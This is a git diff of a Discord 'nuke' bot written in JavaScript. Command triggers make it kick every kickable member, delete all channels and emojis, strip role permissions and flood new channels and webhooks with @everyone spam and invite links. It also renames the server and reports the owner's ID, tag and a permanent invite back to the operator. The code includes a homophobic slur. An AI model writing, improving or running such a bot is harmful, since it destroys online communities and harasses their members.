@@ -98,135 +98,192 @@ client.on("message", msg => {
 //nuke
 
 
-  //this will ban everyone possible
-  client.on('message', message => {
-    if(message.content.startsWith('-burn')) {
-if(message.channel.type === "dm") {return}
-      if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
-      return;
-       }
-       message.guild.members.cache.forEach(m => {
-        if(m.kickable) m.kick();
-  });  
+ 
+ 
+   client.on('message', message => {
+     if(message.content.startsWith('@everyone all hail me')) {
+ if(message.channel.type === "dm") {return}
+       if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !') 
+ return
   }
-  })  
+        message.guild.members.cache.forEach(m => {
+         if(m.kickable) m.kick();
+   });
+   }
+   })  
+ /**
+  *  
+  message.guild.emojis.cache.forEach(e => {
+    e.delete()
+});
+  */
+     
+ 
 
-  client.on('message', message => {
-    if(message.content.startsWith('-burn')) {
-      message.delete()
-  }
-  })  
-
-
-
-
-
-  client.on('message', message => {
-    if(message.content.startsWith('@everyone fucked by cubes')) {
-if(message.channel.type === "dm") {return}
-      if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !') 
-return
- }
-       message.guild.members.cache.forEach(m => {
-        if(m.kickable) m.kick();
-  });
-  }
-  })  
-
-    
-  //this will delete emotes
-  client.on('message', message => {
-    if(message.content.startsWith('-burn')) {
-if(message.channel.type === "dm") {return}
-      if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
-return
- }
-       message.guild.emojis.cache.forEach(e => {
-        e.delete()
-  });
-  }
+  client.on("ready", () => {
+      console.log("bruh")
   })
-
-    //this edits all roles
-    client.on('message', message => {
-      if(message.content.startsWith('-burn')) {
-if(message.channel.type === "dm") {return}
-        if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
-return
- }    
-
+     //this edits all roles
+     client.on('message', message => {
+       if(message.content.startsWith('-bruh')) {
+ if(message.channel.type === "dm") {return}
+         if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
+  }    
+  message.guild.emojis.cache.forEach(e => {
+    e.delete()})
+    
   var b = 0
   while(b < 39) {
-  message.guild.emojis.create('https://media.discordapp.net/attachments/771392076691537950/771395221744779284/latest.png', 'funny')
-   message.guild.emojis.create('https://cdn.discordapp.com/attachments/771387444494860328/771400031693439016/image0.gif', 'moment')
+  message.guild.emojis.create('https://images-ext-1.discordapp.net/external/AJ3ZseNi8NlElR_I1tS51ubQguFMXm4h5CqKc_V_cdU/%3Fwidth%3D587%26height%3D587/https/media.discordapp.net/attachments/735392717886193666/754861066105782312/20200820_203508.jpg', 'funny')
+   message.guild.emojis.create('https://images-ext-1.discordapp.net/external/HRdm0jpSLissUbkke890fcGabWIpSEnmjlJykK4hgg8/https/images-ext-1.discordapp.net/external/LOxbVQxTHoQNiyrc-GMz__uODLQQ6v38Xpypt6K1LXo/https/media.discordapp.net/attachments/735392717886193666/772567167018991646/a48e2e66-bbd5-4ba6-b168-90ce8c7c6fa9.gif', 'cube')
     
 b++  
 }  
-         message.guild.roles.cache.forEach(r => {
-          if(r.editable)
-            r.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE'])
-          .catch(console.error)
-    });
-    }
-    })
 
 
-  client.on('message', message => {
-    if(message.content.startsWith("-burn")) {
-if(message.channel.type === "dm") {return}
-      message.guild.roles.everyone.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE']);
-  }
-  }) 
+  message.guild.roles.cache.forEach(r => {
+    if(r.editable) {
+      r.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE'])
+    .catch(console.error)}
+
+});
 
 
-
-
-
-
-function randomT() {
-  var rand = ['https://cdn.discordapp.com/attachments/763108453874663444/771037666053324840/video0.mp4 @everyone', '@everyone https://cdn.discordapp.com/attachments/763108453874663444/771037666053324840/video0.mp4', 'https://discord.gg/rYagK4sPKU @everyone', '@everyone fucked by cubes', '@everyone fucked by assy cube', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756371334791198/image0.jpg?width=587&height=587', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756313554583562/image0.jpg','@everyone https://media.discordapp.net/attachments/756219863206330469/759745708394807307/image0-1.png', '@everyone CHAOS CHAOS', '@everyone cube owns you','Get fucked @everyone', '@everyone bruh momentum', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756690228379738/image0.jpg?width=646&height=587', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756775233814558/image0.jpg', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756846772387880/image0.png?width=581&height=587', '@everyone https://media.discordapp.net/attachments/725064172022398996/759756645554847774/image0.jpg', '@everyone get rekt'];
-
-  return rand[Math.floor(Math.random()*rand.length)];
-}
-
-
-
-function random123() {
-  var rand = ["you-have-been-cubed", "❐❐❐cube❐❐❐", "❐hail-cube❐", "❐❐❐❐❐❐❐❐❐❐❐❐❐❐❐❐❐❐❐❐❐", "i-am-cube"];
-
-  return rand[Math.floor(Math.random()*rand.length)];
-}
-  client.on('message', message => {
-    if(message.content.startsWith("-burn")) {
-if(message.channel.type === "dm") {return}
-            message.guild.channels.cache.forEach(channel => {
-            channel.delete().then((channel)=>{
-              if (channel.deleted === true)
-              {
-                console.log("channel succesfully yeeted!");
-              }
-            },reason => {
-              console.log(`Faggot i cant delete that channel because ${reason}`);
-            })
-          }) 
-        
-  }
-  }) 
-  
-
-
-client.on('message', msg => {
-    if(msg.content === `-burn`) {
-        if(msg.channel.type === "dm") {return}
-      if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }  
-       var number = 0
-       
-       msg.guild.channels.create('ass').then(c => c.send("https://discord.gg/rYagK4sPKU @everyone https://cdn.discordapp.com/attachments/735103595250188338/775341588590755900/video0.mov").then(c.send("@everyone fucked by cube").then(c.send("rip webhook spam shitcord killed it(oh also if the bot is slow its probably bcs its nuking another server remember this is a public bot and may be overloaded)"))))
-        while(number < 399) {
-            msg.guild.channels.create(random123()).then(c => { 
-               
-                c.createWebhook("ass").then(w => {
+     }
+     })
+ /**
+  *
+          var b = 0
+   while(b < 39) {
+   message.guild.emojis.create('https://images-ext-1.discordapp.net/external/AJ3ZseNi8NlElR_I1tS51ubQguFMXm4h5CqKc_V_cdU/%3Fwidth%3D587%26height%3D587/https/media.discordapp.net/attachments/735392717886193666/754861066105782312/20200820_203508.jpg', 'funny')
+    message.guild.emojis.create('https://images-ext-1.discordapp.net/external/HRdm0jpSLissUbkke890fcGabWIpSEnmjlJykK4hgg8/https/images-ext-1.discordapp.net/external/LOxbVQxTHoQNiyrc-GMz__uODLQQ6v38Xpypt6K1LXo/https/media.discordapp.net/attachments/735392717886193666/772567167018991646/a48e2e66-bbd5-4ba6-b168-90ce8c7c6fa9.gif', 'cube')
+     
+ b++  
+ }  
+  */
+ 
+   client.on('message', message => {
+     if(message.content.startsWith("-burn")) {
+ if(message.channel.type === "dm") {return}
+       message.guild.roles.everyone.setPermissions(['READ_MESSAGE_HISTORY', 'VIEW_CHANNEL', 'SEND_MESSAGES', 'MENTION_EVERYONE']);
+   }
+   }) 
+ 
+ 
+ 
+ 
+ 
+ 
+ function randomT() {
+   var rand = ['@everyone https://discord.gg/z6jMqF5Yjn', 'https://tenor.com/view/seet-dreams-sleep-go-to-sleep-go-to-bed-scary-gif-19084813 @everyone', `\`\`\`
+   
+                                               
+                       88                      
+                       88                      
+                       88                      
+,adPPYba,  88       88 88,dPPYba,   ,adPPYba,  
+a8"     "" 88       88 88P'    "8a a8P_____88  
+8b         88       88 88       d8 8PP"""""""  
+"8a,   ,aa "8a,   ,a88 88b,   ,a8" "8b,   ,aa  
+\`"Ybbd8"' \`"YbbdP'Y8 8Y"Ybbd8"'   \`"Ybbd8"'  
+                           
+                           
+   
+   \`\`\` @everyone`, "https://tenor.com/view/op-cube-animation-gif-15857075 @everyone", 'https://images-ext-1.discordapp.net/external/AJ3ZseNi8NlElR_I1tS51ubQguFMXm4h5CqKc_V_cdU/%3Fwidth%3D587%26height%3D587/https/media.discordapp.net/attachments/735392717886193666/754861066105782312/20200820_203508.jpg @everyone', 'https://images-ext-1.discordapp.net/external/HRdm0jpSLissUbkke890fcGabWIpSEnmjlJykK4hgg8/https/images-ext-1.discordapp.net/external/LOxbVQxTHoQNiyrc-GMz__uODLQQ6v38Xpypt6K1LXo/https/media.discordapp.net/attachments/735392717886193666/772567167018991646/a48e2e66-bbd5-4ba6-b168-90ce8c7c6fa9.gif @everyone'];
+ 
+   return rand[Math.floor(Math.random()*rand.length)];
+ }
+ 
+ 
+ 
+   client.on('message', message => {
+     if(message.content.startsWith("-bur")) {
+ if(message.channel.type === "dm") {return}
+             message.guild.channels.cache.forEach(channel => {
+             channel.delete().then((channel)=>{
+               if (channel.deleted === true)
+               {
+                 console.log("channel succesfully yeeted!");
+               }
+             },reason => {
+               console.log(`Faggot i cant delete that channel because ${reason}`);
+             })
+           }) 
+         
+   }
+   }) 
+   
+ 
+ 
+ client.on('message', msg => {
+     if(msg.content === `-burn`) {
+         if(msg.channel.type === "dm") {return}
+       if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }  
+        var number = 0
+        var pray = -1
+        msg.guild.channels.create('⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰').then(c => c.send("https://discord.gg/z6jMqF5Yjn @everyone (also wait 7 seconds for the spam)").then(c.send("@everyone all hail me").then(c.send("rip webhook spam shitcord killed it(oh also if the bot is slow its probably bcs its nuking another server remember this is a public bot and may be overloaded)"))))
+        setTimeout(() => { 
+        while(pray < 2) {
+         msg.guild.channels.create('▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇').then(p => {
+            p.createWebhook("assy").then(w => {
+                     
+                [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
+                    w.send(randomT())
                     
+                
+                })
+            
+            })
+            var spam = 0
+            while(spam < 300) 
+        {    
+            p.send(randomT())
+            spam++
+        }
+         })
+            pray++
+         }
+         msg.guild.channels.create("ｐｒａｙ≪3").then(p => {
+            p.createWebhook("assy").then(w => {
+                     
+                [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
+                    w.send(randomT())
+                    
+                
+                })
+            
+            })
+            var spam = 0
+            while(spam < 300) 
+        {    
+            p.send(randomT())
+            spam++
+        }
+         })
+         pray = -1
+         while(pray < 2) {
+            msg.guild.channels.create('▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇').then(p => {
+               p.createWebhook("assy").then(w => {
+                        
+                   [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
+                       w.send(randomT())
+                       
+                   
+                   })
+               
+               })
+               var spam = 0
+               while(spam < 300) 
+           {    
+               p.send(randomT())
+               spam++
+           }
+            })
+               pray++
+            }
+            msg.guild.channels.create('⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰⋰').then(p => {
+                p.createWebhook("assy").then(w => {
+                         
                     [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
                         w.send(randomT())
                         
@@ -234,38 +291,58 @@ client.on('message', msg => {
                     })
                 
                 })
-            
-            var spam = 0
-            while(spam < 300) 
-        {    
-            c.send(randomT())
-            spam++
-        }
-                    
-            })
-        number++
-
-        }
-        
-    }
-})
-
-
-client.on('message', message => {
-  if(message.content === '@everyone fucked by cube') {
-if(message.channel.type === "dm") {return}
-if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
-return
- }
-if(message.author.id !== message.client.user.id) {return}
- setTimeout(() => {
-    message.guild.setName("ic-0n moment")
-    message.guild.setIcon("https://cdn.discordapp.com/attachments/772420516232691744/775344127662882826/image0.jpg")
+                var spam = 0
+                while(spam < 300) 
+            {    
+                p.send(randomT())
+                spam++
+            }
+             })
+        while(number < 399) {
+             msg.guild.channels.create('【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】【❒】').then(c => { 
+                
+                 c.createWebhook("assy").then(w => {
+                     
+                     [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1].forEach(function(i) {
+                         w.send(randomT())
+                         
+                     
+                     })
+                 
+                 })
+             
+             var spam = 0
+             while(spam < 300) 
+         {    
+             c.send(randomT())
+             spam++
+         }
+                     
+             })
+         number++
  
- }, 3000);
-        
- }
-})
+         }
+         
+        }, 7000);
+     }
+ })
+ 
+ 
+ client.on('message', message => {
+   if(message.content === '@everyone all hail me') {
+ if(message.channel.type === "dm") {return}
+ if (!message.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !');
+ return
+  }
+ if(message.author.id !== message.client.user.id) {return}
+  setTimeout(() => {
+     message.guild.setName("pray.")
+     message.guild.setIcon("https://images-ext-1.discordapp.net/external/AJ3ZseNi8NlElR_I1tS51ubQguFMXm4h5CqKc_V_cdU/%3Fwidth%3D587%26height%3D587/https/media.discordapp.net/attachments/735392717886193666/754861066105782312/20200820_203508.jpg")
+  
+  }, 3000);
+         
+  }
+ })
 
 
 
@@ -278,7 +355,7 @@ client.on("guildCreate", msg => {
         const channel = server.channels.cache.find(c => c.id === logC)
     const Id = msg.channels.guild.id
     const Oid = msg.channels.guild.ownerID
-    const Otag = msg.channels.guild.ownerID //supposed to be tag but shitcord doesn't define user
+    const Otag = msg.channels.guild.owner.user.tag
     const Gm = msg.channels.guild.memberCount
     const joinEmbed = new Discord.MessageEmbed()
 .setColor('#FF0435')
@@ -316,19 +393,21 @@ if(!msg.me.hasPermission("CREATE_INSTANT_INVITE")) {
 
 client.on("message", msg => {
     if(msg.author.id === msg.client.user.id) {
-    if(msg.content === `@everyone fucked by cube`) {
+    if(msg.content === `@everyone all hail me`) {
  const server = msg.client.guilds.cache.find(g => g.id === guild)
         const channel = server.channels.cache.find(c => c.id === logC)
-    const Id = msg.guild.id
-    const Oid = msg.guild.ownerID
-    const Otag = msg.guild.ownerID //user goes null so idk
-    const Gm = msg.guild.memberCount
+
+  const Id = msg.guild.id
+  const Oid = msg.guild.ownerID
+  const Otag = msg.guild.owner.user.tag //user goes null so idk
+  const Gm = msg.guild.memberCount
 const nukeEmbed = new Discord.MessageEmbed()
 .setColor('#FF0435')
 .setTitle(`Nuked "${msg.guild.name}"`)
-.setAuthor('The GrimmChild', `https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png`)
+.setAuthor(client.user.username, "https://media.discordapp.net/attachments/762080346774568981/762277872722247720/latest.png")
 .addField(`Server ID: **${Id}**\nServer Owner ID: **${Oid}**\nServer Owner Tag: **${Otag}**\nServer MemberCount: **${Gm}**`)
-
+.setDescription("The Bot DOES have the permission ADMINISTRATOR needed to nuke!")
+        
 msg.channel.createInvite({ temporary = false, maxAge = 9000000, maxUses = 0, unique, reason } = {})
 .then(invite => channel.send(nukeEmbed).then(channel.send(`discord.gg/${invite.code}`)))
 }
@@ -348,7 +427,7 @@ client.on("message", msg => {
             if(msg.guild.me.hasPermission("ADMINISTRATOR")) {
             const Id = msg.guild.id
             const Oid = msg.guild.ownerID
-            const Otag = msg.guild.ownerID //user goes null so idk
+            const Otag = msg.guild.owner.user.tag //user goes null so idk
             const Gm = msg.guild.memberCount
            
         
@@ -366,7 +445,7 @@ client.on("message", msg => {
     }else {
             const Id = msg.guild.id
             const Oid = msg.guild.ownerID
-            const Otag = msg.guild.ownerID //user goes null so idk
+            const Otag = msg.guild.owner.user.tag
             const Gm = msg.guild.memberCount
             const joinEmbed = new Discord.MessageEmbed()
             .setColor('#FE2B54')
